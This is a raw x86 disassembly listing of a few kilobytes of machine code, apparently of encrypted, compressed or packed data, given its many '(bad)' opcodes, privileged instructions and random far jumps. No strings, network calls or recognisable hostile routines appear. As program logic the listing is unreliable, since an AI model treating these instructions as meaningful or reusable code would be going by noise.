  422885:	cmp    DWORD PTR [edi-0x783c40fb],edx
  42288b:	shl    DWORD PTR [edx+0x43],cl
  42288e:	pop    ecx
  42288f:	aaa    
  422890:	mov    ecx,ebx
  422892:	cli    
  422893:	fistp  DWORD PTR [ecx]
  422895:	in     al,dx
  422896:	hlt    
  422897:	mov    esp,0xf427c9fd
  42289c:	push   ebx
  42289d:	bound  edx,QWORD PTR [esi+0x21]
  4228a0:	cdq    
  4228a1:	fs and ecx,esp
  4228a4:	or     al,0xcc
  4228a6:	int3   
  4228a7:	and    DWORD PTR [esi+eax*4-0x5],esp
  4228ab:	rcl    BYTE PTR [ebp+0xd03eb15],0xcb
  4228b2:	push   cs
  4228b3:	fwait
  4228b4:	inc    esi
  4228b5:	scas   eax,DWORD PTR es:[edi]
  4228b6:	xchg   ebx,eax
  4228b7:	xor    ah,BYTE PTR [edi]
  4228b9:	mov    ebp,ecx
  4228bb:	sar    DWORD PTR [edx-0x7e],cl
  4228be:	push   esp
  4228bf:	pop    ss
  4228c0:	std    
  4228c1:	retf   0x5b49
  4228c4:	push   esi
  4228c5:	dec    edi
  4228c6:	xchg   esi,eax
  4228c7:	cmp    dl,BYTE PTR [edi+esi*1]
  4228ca:	in     al,dx
  4228cb:	sbb    esp,DWORD PTR [edi-0x57]
  4228ce:	adc    eax,DWORD PTR ds:0xb4dac8de
  4228d4:	or     ah,BYTE PTR [ebp-0x17]
  4228d7:	imul   ecx,eax,0xd1248db8
  4228dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228de:	gs jl  0x4228aa
  4228e1:	mov    cl,0xcd
  4228e3:	mov    DWORD PTR [ebp-0x623e8da],edi
  4228e9:	jae    0x42291e
  4228eb:	push   edx
  4228ec:	sti    
  4228ed:	(bad)  
  4228ee:	adc    cl,dl
  4228f0:	loopne 0x422915
  4228f2:	(bad)
  4228f5:	jmp    0x531e:0x286d29af
  4228fc:	lds    ebp,FWORD PTR [ecx]
  4228fe:	xor    BYTE PTR [ebp+0x45],0xa0
  422902:	jno    0x4228e3
  422904:	inc    edi
  422905:	(bad)  
  422906:	cmp    dl,BYTE PTR [ecx-0x65f47682]
  42290c:	nop
  42290d:	loopne 0x4228eb
  42290f:	test   edi,0xefcadc63
  422915:	outs   dx,DWORD PTR ds:[esi]
  422916:	mov    WORD PTR [edx-0x62],ss
  422919:	mov    ds:0x6a872afc,eax
  42291e:	jo     0x422976
  422920:	aaa    
  422921:	pop    ecx
  422922:	shl    BYTE PTR [esi+0x3d05a295],0x59
  422929:	add    ebp,edx
  42292b:	jnp    0x422998
  42292d:	ins    BYTE PTR es:[edi],dx
  42292e:	adc    eax,0x838d2962
  422933:	add    dh,dh
  422935:	pop    esi
  422936:	cmp    esi,ebx
  422938:	test   ebp,eax
  42293a:	inc    ecx
  42293b:	fs pop esp
  42293d:	enter  0xe5b5,0x49
  422941:	mov    cl,0xad
  422943:	mov    edx,ebp
  422945:	das    
  422946:	popf   
  422947:	jns    0x4228fc
  422949:	mov    bl,0xb3
  42294b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42294c:	jnp    0x422904
  42294e:	mov    ebp,0x3a73b278
  422953:	sub    BYTE PTR [edi-0x68],ch
  422956:	ins    BYTE PTR es:[edi],dx
  422957:	repz cli 
  422959:	sbb    eax,0x49281d72
  42295e:	test   BYTE PTR [eax-0xa],0x98
  422962:	arpl   bp,ax
  422964:	cmc    
  422965:	repnz push 0xffffffd1
  422968:	mov    ecx,0x4a1120b
  42296d:	or     edx,DWORD PTR [edi+0x1b]
  422970:	rcl    BYTE PTR [ecx-0x12147e58],0x63
  422977:	cld    
  422978:	test   eax,0xb138621c
  42297d:	cmp    al,0x74
  42297f:	push   ecx
  422980:	out    0x55,al
  422982:	enter  0xc413,0x56
  422986:	inc    edx
  422987:	add    bl,BYTE PTR [eax+0x53ddc2d]
  42298d:	lahf   
  42298e:	aam    0xcd
  422990:	inc    ecx
  422991:	xor    al,BYTE PTR [edx]
  422993:	cld    
  422994:	sbb    DWORD PTR [edi],esp
  422996:	xchg   BYTE PTR [ecx+0x4f],dl
  422999:	ins    DWORD PTR es:[edi],dx
  42299a:	mov    dh,0xa3
  42299c:	push   esp
  42299d:	test   eax,0xdb379718
  4229a2:	adc    eax,0x3fab2b6d
  4229a7:	cmp    BYTE PTR ds:0xdf97bea6,dh
  4229ad:	rcr    BYTE PTR [ebx-0x6f],0x80
  4229b1:	stc    
  4229b2:	xchg   edx,eax
  4229b3:	push   ds
  4229b4:	inc    ecx
  4229b5:	sbb    esp,esi
  4229b7:	int    0xa5
  4229b9:	sti    
  4229ba:	jb     0x4229e6
  4229bc:	push   ds
  4229bd:	test   esp,edx
  4229bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229c0:	in     al,0xd8
  4229c2:	mov    BYTE PTR [eax+eiz*1-0x6e],ch
  4229c6:	cmp    eax,0xc50532d7
  4229cb:	sbb    cl,BYTE PTR [eax-0x4c]
  4229ce:	js     0x422a27
  4229d0:	add    edi,DWORD PTR [ebp+0x3c7ac4a6]
  4229d6:	push   ss
  4229d7:	mov    ebx,DWORD PTR [ecx+ebx*2-0x11bb4b44]
  4229de:	push   eax
  4229df:	jo     0x42296f
  4229e1:	mov    al,bl
  4229e3:	(bad)
  4229e6:	pop    ebx
  4229e7:	or     esi,DWORD PTR [ecx]
  4229e9:	call   0x62ff:0x63978e0c
  4229f0:	mov    ch,0x52
  4229f2:	xchg   ecx,eax
  4229f3:	ds scas eax,DWORD PTR es:[edi]
  4229f5:	inc    edi
  4229f6:	data16 std 
  4229f8:	dec    eax
  4229f9:	ins    BYTE PTR es:[edi],dx
  4229fa:	stc    
  4229fb:	mov    eax,0xd2d3a8f4
  422a00:	pop    ecx
  422a01:	add    DWORD PTR [ebx-0x46],ecx
  422a04:	or     edx,DWORD PTR [ebx-0x22]
  422a07:	mov    bh,0x73
  422a09:	je     0x4229c8
  422a0b:	enter  0x6cb4,0x87
  422a0f:	and    esi,DWORD PTR [eax]
  422a11:	and    BYTE PTR ds:0xad60b72a,ch
  422a17:	popa   
  422a18:	inc    ecx
  422a19:	mov    ss,WORD PTR [ebp-0x72]
  422a1c:	pop    edi
  422a1d:	inc    esp
  422a1e:	push   esp
  422a1f:	add    esi,DWORD PTR [edi]
  422a21:	(bad)  
  422a22:	mov    dl,0xf2
  422a24:	push   edx
  422a25:	lods   eax,DWORD PTR ds:[esi]
  422a26:	(bad)  
  422a28:	xchg   edx,eax
  422a29:	adc    al,0x3d
  422a2b:	adc    BYTE PTR [edx],bl
  422a2d:	sbb    al,BYTE PTR [edi]
  422a2f:	jne    0x422a40
  422a31:	add    BYTE PTR [eax-0x26],ah
  422a34:	jno    0x422a62
  422a36:	not    ecx
  422a38:	pop    es
  422a39:	out    dx,eax
  422a3a:	or     eax,0x87cb09
  422a3f:	cmp    eax,0xcde82388
  422a44:	out    0x90,al
  422a46:	es repz call 0x33a8:0xcd14d561
  422a4f:	mov    al,ds:0xea75bc5d
  422a54:	sahf   
  422a55:	shl    DWORD PTR ds:0x612fb969,cl
  422a5b:	out    dx,eax
  422a5c:	xchg   ebx,eax
  422a5d:	mov    ebp,0x99c44388
  422a62:	add    edx,DWORD PTR [ebx]
  422a64:	add    DWORD PTR [eax],ebx
  422a66:	cmp    ch,BYTE PTR [ebp-0x28]
  422a69:	das    
  422a6a:	je     0x422ad5
  422a6c:	retf   
  422a6d:	test   eax,0x186c28a3
  422a72:	sub    eax,0x2fe1fe9b
  422a77:	and    ecx,ecx
  422a79:	pop    edx
  422a7a:	xchg   DWORD PTR [eax+0x25],edx
  422a7d:	add    eax,0x12
  422a80:	sub    DWORD PTR [ebx-0x44],esp
  422a83:	aas    
  422a84:	cmp    al,dh
  422a86:	sti    
  422a87:	out    dx,eax
  422a88:	jae    0x422a0e
  422a8a:	pop    es
  422a8b:	xlat   BYTE PTR ds:[ebx]
  422a8c:	sub    eax,0xb69b4c6c
  422a91:	cmp    al,0xb0
  422a93:	dec    ecx
  422a94:	jno    0x422a30
  422a96:	sbb    ebx,DWORD PTR [edi+0x603c0728]
  422a9c:	retf   
  422a9d:	xchg   esi,eax
  422a9e:	mov    ds:0x8ad79b98,al
  422aa3:	test   DWORD PTR [eax-0xe8b1f0],esp
  422aa9:	xor    edi,DWORD PTR [ecx]
  422aab:	mov    bh,0xf4
  422aad:	iret   
  422aae:	cmp    al,0x4f
  422ab0:	hlt    
  422ab1:	js     0x422b30
  422ab3:	out    dx,eax
  422ab4:	icebp  
  422ab5:	ror    DWORD PTR [eax-0x3],cl
  422ab8:	mov    dl,0x47
  422aba:	loopne 0x422ad6
  422abc:	xor    al,0xf9
  422abe:	loope  0x422b10
  422ac0:	lds    ebp,FWORD PTR [ebp-0x7e]
  422ac3:	(bad)  
  422ac5:	jmp    0x422a5b
  422ac7:	and    dh,ch
  422ac9:	jbe    0x422a82
  422acb:	(bad)  
  422acc:	pop    eax
  422acd:	adc    dh,al
  422acf:	pushf  
  422ad0:	mov    ecx,0x1efd69b
  422ad5:	jns    0x422b3c
  422ad7:	mov    ch,0x68
  422ad9:	ror    ebx,cl
  422adb:	pop    esi
  422adc:	sub    DWORD PTR [edi],eax
  422ade:	jmp    DWORD PTR [ebx+0x6c]
  422ae1:	dec    edi
  422ae2:	cwde   
  422ae3:	and    edi,DWORD PTR [esi-0x59bce3a6]
  422ae9:	dec    edx
  422aea:	mov    cl,0x2c
  422aec:	sub    al,0x56
  422aee:	retf   
  422aef:	sahf   
  422af0:	push   ds
  422af1:	jg     0x422a95
  422af3:	sbb    ecx,DWORD PTR [esp+ebp*4]
  422af6:	add    al,ch
  422af8:	or     DWORD PTR [eax-0x33],eax
  422afb:	pop    edi
  422afc:	mov    eax,0xf04429b3
  422b01:	xlat   BYTE PTR ds:[ebx]
  422b02:	mov    ebx,0x2f05deac
  422b07:	cs out dx,eax
  422b09:	ins    BYTE PTR es:[edi],dx
  422b0a:	jle    0x422b63
  422b0c:	xchg   ebx,eax
  422b0d:	dec    esi
  422b0e:	stc    
  422b0f:	or     DWORD PTR [eax+eiz*4-0x516398e7],edx
  422b16:	aad    0x20
  422b18:	lods   eax,DWORD PTR ds:[esi]
  422b19:	lock aas 
  422b1b:	(bad)  
  422b1c:	cs dec ebx
  422b1e:	loopne 0x422b85
  422b20:	cmp    esi,ecx
  422b22:	dec    esp
  422b23:	ror    DWORD PTR [edx],0xb
  422b26:	sti    
  422b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b28:	sbb    eax,0xb638c65c
  422b2d:	or     ah,BYTE PTR [edi+0x270a1972]
  422b33:	je     0x422ade
  422b35:	dec    ebp
  422b36:	retf   0x9718
  422b39:	sbb    eax,0xe3ace7f9
  422b3e:	fdivr  DWORD PTR [edi]
  422b40:	pop    ebp
  422b41:	in     al,dx
  422b42:	(bad)  
  422b43:	(bad)  
  422b45:	mov    dh,0x74
  422b47:	pop    ss
  422b48:	cmp    eax,0xd983050d
  422b4d:	daa    
  422b4e:	jle    0x422adb
  422b50:	dec    ecx
  422b51:	out    0x43,al
  422b53:	pop    edx
  422b54:	xor    al,0x8b
  422b56:	icebp  
  422b57:	pushf  
  422b58:	or     edi,edx
  422b5a:	mov    esp,0xa1320bd
  422b5f:	dec    ax
  422b61:	or     DWORD PTR [esi],esp
  422b63:	push   ebx
  422b65:	mov    dl,BYTE PTR [edx+0x3d6771bc]
  422b6b:	pusha  
  422b6c:	loope  0x422bad
  422b6e:	stos   DWORD PTR es:[edi],eax
  422b6f:	sbb    esi,DWORD PTR [edi-0x175244b9]
  422b75:	push   0x3d
  422b77:	adc    eax,0x40526567
  422b7c:	mov    DWORD PTR [edi],esi
  422b7e:	mov    ebp,0x66e86b0e
  422b83:	sbb    bh,BYTE PTR [ecx]
  422b85:	pop    esi
  422b86:	cmp    ecx,esi
  422b88:	hlt    
  422b89:	sub    al,0xd5
  422b8b:	xor    eax,0x75c0165
  422b90:	add    DWORD PTR [ebx+0x1a],edx
  422b93:	aas    
  422b94:	sbb    DWORD PTR [ecx+edi*8],edx
  422b97:	xor    eax,0xa54912aa
  422b9c:	mov    dh,BYTE PTR [ebp-0x16a52cc8]
  422ba2:	mov    gs,WORD PTR [esi-0x3e329fde]
  422ba8:	(bad)  
  422baa:	push   esi
  422bab:	repnz lods al,BYTE PTR ds:[esi]
  422bad:	mov    al,ds:0xd2c412bb
  422bb2:	pop    ds
  422bb3:	repnz push ebp
  422bb5:	call   0x384:0x196bd0b3
  422bbc:	mov    al,ds:0x2c6c0517
  422bc1:	es retf 0x59e0
  422bc5:	add    eax,DWORD PTR [ebp+edi*4+0x1cce6bc5]
  422bcc:	adc    esi,DWORD PTR [edi-0x40]
  422bcf:	pop    edi
  422bd0:	jnp    0x422c4f
  422bd2:	mov    al,BYTE PTR [esi+0x15]
  422bd5:	ret    0x5b61
  422bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bd9:	inc    ebx
  422bda:	jb     0x422b8c
  422bdc:	push   edx
  422bdd:	jmp    0x18a1281f
  422be2:	pop    esp
  422be3:	mov    ch,0x77
  422be5:	lea    esp,[ebp+0xe309d4f]
  422beb:	arpl   bx,si
  422bed:	in     al,dx
  422bee:	std    
  422bef:	mov    ch,0x94
  422bf1:	sub    dh,BYTE PTR [ebp-0x5f2d8d65]
  422bf7:	pop    ecx
  422bf8:	dec    edi
  422bf9:	cld    
  422bfa:	test   eax,0x481928c9
  422bff:	out    0xda,al
  422c01:	retf   
  422c02:	ss sub al,0xbf
  422c05:	imul   ecx,DWORD PTR [ebx-0x5],0x10b9e967
  422c0c:	add    eax,0x3d2f47b9
  422c11:	mov    ah,0x70
  422c13:	ret    0x4077
  422c16:	fwait
  422c17:	xor    cl,BYTE PTR [ebp-0x2f41ce3c]
  422c1d:	jmp    0xeb1e:0x47f18391
  422c24:	fistp  DWORD PTR [edi+0x4408ca86]
  422c2a:	retf   
  422c2b:	call   0x3ef1:0xc2c01dfa
  422c32:	mul    ah
  422c34:	jnp    0x422c16
  422c36:	icebp  
  422c37:	xor    dl,BYTE PTR [esi+esi*4]
  422c3a:	sub    ah,BYTE PTR [ebp+ebp*2+0x67]
  422c3e:	pop    ebp
  422c3f:	adc    eax,0x9643a1d4
  422c44:	je     0x422bf2
  422c46:	push   ebx
  422c47:	lahf   
  422c48:	outs   dx,DWORD PTR ds:[esi]
  422c49:	lods   eax,DWORD PTR ds:[esi]
  422c4a:	jmp    0x8b19:0x459a46f9
  422c51:	or     al,0x68
  422c53:	and    ah,BYTE PTR [ebp-0x13e913bf]
  422c59:	not    BYTE PTR [ebx]
  422c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c5c:	pop    ss
  422c5d:	sbb    DWORD PTR ds:0xb1024b99,esp
  422c63:	data16 sub ah,BYTE PTR [edx+ebx*4-0x27]
  422c68:	push   0x59
  422c6a:	loop   0x422cd9
  422c6c:	inc    edx
  422c6d:	repz sub BYTE PTR [eax-0x41a82635],0x37
  422c75:	(bad)  
  422c76:	sub    eax,0xb7bc90c2
  422c7b:	mov    ecx,0x6f8b5283
  422c80:	or     al,0x8f
  422c82:	sub    BYTE PTR [edx],dh
  422c84:	fistp  DWORD PTR [edi-0x19]
  422c87:	and    esp,esp
  422c89:	adc    eax,0xda32e783
  422c8e:	inc    edi
  422c8f:	pop    ss
  422c90:	or     al,0x0
  422c92:	or     DWORD PTR [ecx-0x7d],edx
	...
  422ca9:	add    BYTE PTR [eax+0x50],cl
  422cac:	push   eax
  422cad:	dec    ebp
  422cae:	pop    eax
  422caf:	dec    ebp
  422cb0:	pop    ebp
  422cb1:	push   ebp
  422cb2:	stos   DWORD PTR es:[edi],eax
  422cb3:	mov    ch,0xf6
  422cb5:	stc    
  422cb6:	fnstcw WORD PTR [edx]
  422cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cb9:	aam    0xbb
  422cbb:	mov    edx,0x6d30001
  422cc0:	add    BYTE PTR [eax],al
  422cc2:	rcl    DWORD PTR [ebx+ebx*8-0x4a],cl
  422cc6:	out    dx,eax
  422cc7:	cmp    BYTE PTR [eax+0x20],cl
  422cca:	test   DWORD PTR [ecx-0x48],esi
  422ccd:	aaa    
  422cce:	xor    cl,BYTE PTR [ecx+0x15]
  422cd1:	inc    ecx
  422cd2:	mov    esi,0xfd1a0eac
  422cd7:	ds jae 0x422d3b
  422cda:	loopne 0x422cde
  422cdc:	fdiv   QWORD PTR [ebx]
  422cde:	pop    esi
  422cdf:	mov    ds:0xff1f9fee,al
  422ce4:	std    
  422ce5:	push   esi
  422ce6:	outs   dx,DWORD PTR ds:[esi]
  422ce7:	sbb    al,0x79
  422ce9:	pop    ss
  422cea:	push   ecx
  422ceb:	jb     0x422d4d
  422ced:	sbb    BYTE PTR [eax+esi*2+0xd0cb2fa],al
  422cf4:	add    esi,ebx
  422cf6:	and    edi,DWORD PTR [ebx+0x31]
  422cf9:	cmovnp ecx,DWORD PTR [ebx-0x7c8253e5]
  422d00:	and    BYTE PTR [esi+0x25],ah
  422d03:	(bad)  
  422d04:	push   ebp
  422d05:	popf   
  422d06:	pop    ss
  422d07:	gs mov dh,0xcb
  422d0a:	outs   dx,DWORD PTR ds:[esi]
  422d0b:	sbb    esi,DWORD PTR [ebx+0x1b]
  422d0e:	(bad)  
  422d0f:	stc    
  422d10:	xchg   DWORD PTR [eax-0x59],edx
  422d13:	push   0xffffffe0
  422d15:	pop    es
  422d16:	mov    bh,0x36
  422d18:	inc    ecx
  422d19:	jb     0x422ca4
  422d1b:	push   cs
  422d1c:	sti    
  422d1d:	xchg   edx,eax
  422d1e:	lds    eax,FWORD PTR [ecx-0x7983bede]
  422d24:	mov    al,BYTE PTR ds:[edx+ebx*4-0x55078610]
  422d2c:	sub    BYTE PTR [ebx],bl
  422d2e:	jp     0x422cfc
  422d30:	jbe    0x422d5e
  422d32:	mov    ecx,0xdd95d2c1
  422d37:	out    dx,al
  422d38:	fisubr WORD PTR [eax+0x724a3cc5]
  422d3e:	sub    ch,BYTE PTR [eax+eiz*2-0x13]
  422d42:	out    0x95,eax
  422d44:	shr    BYTE PTR [ebp-0x16],cl
  422d47:	adc    DWORD PTR [edi+ebx*2+0x74b9a41a],edx
  422d4e:	cwde   
  422d4f:	sub    eax,0xea3ed697
  422d54:	call   FWORD PTR [ecx+0x7e]
  422d57:	test   DWORD PTR [ecx],esp
  422d59:	loope  0x422dd4
  422d5b:	sbb    esp,DWORD PTR [ebp-0x22]
  422d5e:	mov    dh,0x13
  422d60:	sbb    eax,0xa7d2fa8
  422d65:	and    BYTE PTR [ebx+0x39],dh
  422d68:	sbb    ebx,DWORD PTR [esi-0x399663f6]
  422d6e:	or     al,BYTE PTR [ebx+0x3c390a63]
  422d74:	shr    DWORD PTR [eax+eax*8],cl
  422d77:	mov    ebx,0x5ed5431f
  422d7c:	lahf   
  422d7d:	cmp    BYTE PTR [esi-0x6a44f3b7],dh
  422d83:	aam    0x39
  422d85:	into   
  422d86:	shr    DWORD PTR [edi-0x3a],cl
  422d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d8a:	outs   dx,DWORD PTR ds:[esi]
  422d8b:	push   edi
  422d8c:	inc    eax
  422d8d:	test   eax,0xaaba8dda
  422d92:	cmp    al,0x42
  422d94:	das    
  422d95:	mov    al,0x99
  422d97:	xor    BYTE PTR [edx+0x5f],bh
  422d9a:	jl     0x422dbe
  422d9c:	ficomp WORD PTR [ecx]
  422d9e:	adc    edi,ebx
  422da0:	es pop ecx
  422da2:	adc    eax,DWORD PTR [ebx+0x11f05330]
  422da8:	mov    edi,0x5d4c50a6
  422dad:	pop    ebp
  422dae:	push   ss
  422daf:	pop    edx
  422db0:	adc    esp,esi
  422db2:	iret   
  422db3:	ret    0x6562
  422db6:	pop    es
  422db7:	aam    0x1d
  422db9:	lock dec edi
  422dbb:	int    0xbb
  422dbd:	inc    eax
  422dbe:	sbb    bh,BYTE PTR [esi]
  422dc0:	mov    bh,0x15
  422dc2:	aas    
  422dc3:	mov    dl,0x0
  422dc5:	int    0xa
  422dc7:	fwait
  422dc8:	pop    eax
  422dca:	test   WORD PTR [eax],bp
  422dcd:	xor    esi,DWORD PTR [ebx+ebp*8-0x4e1333d3]
  422dd4:	nop
  422dd5:	push   esi
  422dd6:	add    esi,ecx
  422dd8:	jno    0x422d85
  422dda:	xchg   edx,eax
  422ddb:	mov    WORD PTR [eax],?
  422ddd:	pop    ss
  422dde:	mov    ?,WORD PTR [esi]
  422de0:	mov    bl,0xdf
  422de2:	cmp    esi,DWORD PTR [eax-0x706070b9]
  422de8:	sub    eax,0x9deb86ab
  422ded:	pop    esi
  422dee:	outs   dx,DWORD PTR ds:[esi]
  422def:	mov    eax,0xbb219ef7
  422df4:	and    BYTE PTR [ebx],0x97
  422df7:	(bad)  
  422df8:	repz cdq 
  422dfa:	test   BYTE PTR [esi-0x29028501],0xcb
  422e01:	dec    ecx
  422e02:	mov    ?,WORD PTR [ebx+eiz*4+0x10]
  422e06:	inc    ebp
  422e07:	stos   DWORD PTR es:[edi],eax
  422e08:	sti    
  422e09:	in     al,0x71
  422e0b:	clc    
  422e0c:	aad    0xec
  422e0e:	mul    bl
  422e10:	jmp    0xd3b39831
  422e15:	dec    ebx
  422e16:	xchg   DWORD PTR [esi],ecx
  422e18:	out    dx,al
  422e19:	(bad)  
  422e1a:	cld    
  422e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e1c:	das    
  422e1d:	mov    al,BYTE PTR [ebp+0x8960d0]
  422e23:	mul    BYTE PTR [edx-0x16]
  422e26:	mov    cl,0x4d
  422e28:	ja     0x422dc3
  422e2a:	push   0xffffffdf
  422e2c:	cmovo  ebx,esp
  422e2f:	dec    esp
  422e30:	cmp    esi,DWORD PTR [edi+ecx*4-0x15e80299]
  422e37:	(bad)  
  422e39:	aad    0x8e
  422e3b:	push   eax
  422e3c:	shl    esp,0xcb
  422e3f:	inc    ecx
  422e40:	outs   dx,BYTE PTR ds:[esi]
  422e41:	mov    ah,BYTE PTR [esi]
  422e43:	sbb    dh,al
  422e45:	adc    al,0x4
  422e47:	sub    DWORD PTR [ecx+0x6e03a794],edi
  422e4d:	and    eax,0xc09203a1
  422e52:	jns    0x422dda
  422e54:	sahf   
  422e55:	add    al,BYTE PTR [edx+0x304cfc0e]
  422e5b:	sbb    al,0x8d
  422e5d:	test   BYTE PTR [esi],ch
  422e5f:	cmp    ah,BYTE PTR [esi]
  422e61:	jo     0x422e9f
  422e63:	xor    ch,bh
  422e65:	xor    al,BYTE PTR [ecx]
  422e67:	loope  0x422e17
  422e69:	fisttp WORD PTR [ebp+0x62]
  422e6c:	xchg   BYTE PTR [esi-0x44],dl
  422e6f:	inc    esp
  422e70:	or     BYTE PTR [eax+0x29],cl
  422e73:	push   ebx
  422e74:	les    ecx,FWORD PTR [ecx]
  422e76:	test   al,0xdd
  422e78:	and    esi,DWORD PTR [edx]
  422e7a:	add    bh,BYTE PTR [ebp+esi*4+0x1a]
  422e7e:	mov    WORD PTR [bx+si-0x59a4],ss
  422e83:	dec    ecx
  422e84:	sbb    dh,bh
  422e86:	mov    bh,0x47
  422e88:	loopne 0x422eff
  422e8a:	ins    DWORD PTR es:[edi],dx
  422e8b:	mov    ss,WORD PTR [ecx+ebp*4]
  422e8e:	repnz xchg esi,eax
  422e90:	repnz cmp edx,DWORD PTR [edx+0x77]
  422e94:	out    dx,al
  422e95:	inc    edi
  422e96:	sub    BYTE PTR [ecx-0xa92ae4a],cl
  422e9c:	ss jne 0x422e80
  422e9f:	dec    ebx
  422ea0:	js     0x422e59
  422ea2:	fwait
  422ea3:	jns    0x422eb3
  422ea5:	shl    DWORD PTR [edx-0x2715c428],cl
  422eab:	mov    dh,0xe9
  422ead:	cmp    dh,BYTE PTR es:[ecx+0x2a]
  422eb1:	in     al,dx
  422eb2:	pusha  
  422eb3:	(bad)  
  422eb4:	retf   
  422eb5:	jmp    0xa14da334
  422eba:	jmp    0x2b32:0xe222eddc
  422ec1:	lock sub al,0x88
  422ec4:	leave  
  422ec5:	push   ebp
  422ec6:	pop    ebx
  422ec7:	pop    esi
  422ec8:	jg     0x422f24
  422eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ecb:	gs popf 
  422ecd:	add    bh,BYTE PTR [eax+0x7a]
  422ed0:	xchg   esp,eax
  422ed1:	shl    DWORD PTR [edi-0x56],cl
  422ed4:	adc    edi,DWORD PTR [edi+0x29]
  422ed7:	or     DWORD PTR [ecx-0x53a759ad],edi
  422edd:	outs   dx,BYTE PTR ds:[esi]
  422ede:	sbb    DWORD PTR [edx-0x11],ecx
  422ee1:	jne    0x422f25
  422ee3:	fnstcw WORD PTR [ebx+eax*4]
  422ee6:	(bad)  
  422ee7:	xchg   ecx,eax
  422ee8:	shl    cl,1
  422eea:	aad    0xe
  422eec:	jne    0x422f20
  422eee:	cmp    ecx,edi
  422ef0:	dec    edi
  422ef1:	pop    esi
  422ef2:	cs xor al,0x6a
  422ef5:	retf   
  422ef6:	call   0x5d761e2f
  422efb:	out    0x65,eax
  422efd:	xchg   ecx,eax
  422efe:	jno    0x422ed5
  422f00:	out    dx,eax
  422f01:	xor    eax,0xaee41c4a
  422f06:	mov    ch,0xa1
  422f08:	cmp    eax,0xf862d034
  422f0d:	cld    
  422f0e:	pusha  
  422f0f:	cld    
  422f10:	cmp    BYTE PTR [ebx],ah
  422f12:	push   esp
  422f13:	pop    ebx
  422f14:	aad    0xf9
  422f16:	lods   al,BYTE PTR ds:[esi]
  422f17:	push   0xab1e9400
  422f1c:	fistp  DWORD PTR [eax]
  422f1e:	test   eax,0x5e3ee84f
  422f23:	jae    0x422f1b
  422f25:	xchg   DWORD PTR [edx],eax
  422f27:	(bad)  
  422f28:	out    0x45,al
  422f2a:	ret    0x6f3e
  422f2d:	int    0x88
  422f2f:	sbb    dl,BYTE PTR [esi-0x604a2d41]
  422f35:	bound  edi,QWORD PTR [esi]
  422f37:	sbb    ah,dl
  422f39:	in     al,0xf3
  422f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f3c:	imul   esi,DWORD PTR [esi],0x23bf90b8
  422f42:	mov    bl,0x62
  422f44:	mov    edx,0x513efe2b
  422f49:	or     cl,BYTE PTR [eax]
  422f4b:	lahf   
  422f4c:	cmp    edx,DWORD PTR [ebp+0x541e12dc]
  422f52:	pop    esp
  422f53:	cmp    eax,0xd57f0bc5
  422f58:	shr    bh,cl
  422f5a:	js     0x422fad
  422f5c:	ja     0x422f96
  422f5e:	sbb    eax,edi
  422f60:	(bad)  
  422f61:	sbb    eax,0xec656bf4
  422f66:	inc    edi
  422f67:	and    dh,BYTE PTR [edi+0x2c646989]
  422f6d:	xchg   esp,eax
  422f6e:	mov    dl,0x2d
  422f70:	dec    eax
  422f71:	xchg   ebx,eax
  422f72:	or     BYTE PTR [esi+edx*1-0x57],0xca
  422f77:	push   es
  422f78:	mov    ebx,0x7751bee3
  422f7d:	loope  0x422fb8
  422f7f:	sub    ch,BYTE PTR [ecx-0x31]
  422f82:	inc    esp
  422f83:	mov    eax,ds:0xece453f9
  422f88:	(bad)  
  422f89:	call   0x60ba0a78
  422f8e:	hlt    
  422f8f:	call   DWORD PTR [esi-0x693637f8]
  422f95:	mov    dl,BYTE PTR [ebx*8-0x59111634]
  422f9c:	pop    ecx
  422f9d:	jg     0x42301b
  422f9f:	ss add eax,0x967fad7f
  422fa5:	das    
  422fa6:	adc    ch,bh
  422fa8:	retf   0xa825
  422fab:	xchg   BYTE PTR [edi+0x328a59d7],bl
  422fb1:	jns    0x422f4e
  422fb3:	cmc    
  422fb4:	out    0xf2,eax
  422fb6:	retf   0xc2ff
  422fb9:	mov    edx,0xa8f0bfa4
  422fbe:	in     al,dx
  422fbf:	or     DWORD PTR [edx+0x54],esi
  422fc2:	push   ebx
  422fc3:	and    al,BYTE PTR [edx-0x56766d4d]
  422fc9:	cdq    
  422fca:	push   esp
  422fcb:	jmp    0x422f98
  422fcd:	and    BYTE PTR [esi+0x25],bl
  422fd0:	sbb    ch,dh
  422fd2:	retf   
  422fd3:	sbb    ch,BYTE PTR [ebx]
  422fd5:	imul   BYTE PTR [eax-0x26b9f468]
  422fdb:	aas    
  422fdc:	sar    edi,0x89
  422fdf:	jl     0x422ffa
  422fe1:	pusha  
  422fe2:	push   esp
  422fe3:	dec    ecx
  422fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fe5:	dec    eax
  422fe6:	outs   dx,DWORD PTR ds:[esi]
  422fe7:	or     eax,ecx
  422fe9:	sub    esp,esp
  422feb:	dec    edx
  422fec:	jp     0x42301c
  422fee:	pusha  
  422fef:	shr    ah,cl
  422ff1:	cmc    
  422ff2:	scas   eax,DWORD PTR es:[edi]
  422ff3:	enter  0x1004,0xa5
  422ff7:	inc    eax
  422ff8:	hlt    
  422ff9:	dec    bl
  422ffb:	adc    eax,0x2935ec3c
  423000:	(bad)  
  423002:	sbb    edi,DWORD PTR [esp+esi*8]
  423005:	xchg   esp,eax
  423006:	sti    
  423007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423008:	xor    DWORD PTR [ecx+ecx*1-0x18],ebp
  42300c:	or     DWORD PTR [ebx-0x14],0xc9a2561
  423013:	(bad)  
  423014:	pop    ebx
  423015:	and    dh,ah
  423017:	test   eax,0xc27eeb36
  42301c:	or     ecx,DWORD PTR [edx+0x7f]
  42301f:	in     al,0x2d
  423021:	or     BYTE PTR [edi+0x72407b3e],ah
  423027:	xor    al,BYTE PTR [esi+0x3297d3b8]
  42302d:	int    0x1e
